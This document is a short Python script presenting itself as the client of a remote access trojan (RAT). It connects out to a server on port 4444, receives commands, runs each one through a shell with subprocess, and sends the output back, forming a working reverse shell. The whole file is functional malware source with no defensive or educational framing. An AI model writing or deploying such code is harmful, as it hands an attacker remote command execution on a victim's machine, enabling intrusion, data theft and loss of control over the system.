
import socket
import os
import subprocess

def connect_to_server(host='127.0.0.1', port=4444):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    print(f"Connected to RAT server at {host}:{port}")
    
    while True:
        command = client.recv(4096).decode()
        if command.lower() == 'exit':
            break
        if command.startswith('cd '):
            os.chdir(command[3:])
            client.send(b'Changed directory')
        else:
            output = subprocess.getoutput(command)
            client.send(output.encode())
    
    client.close()

if __name__ == "__main__":
    connect_to_server()
    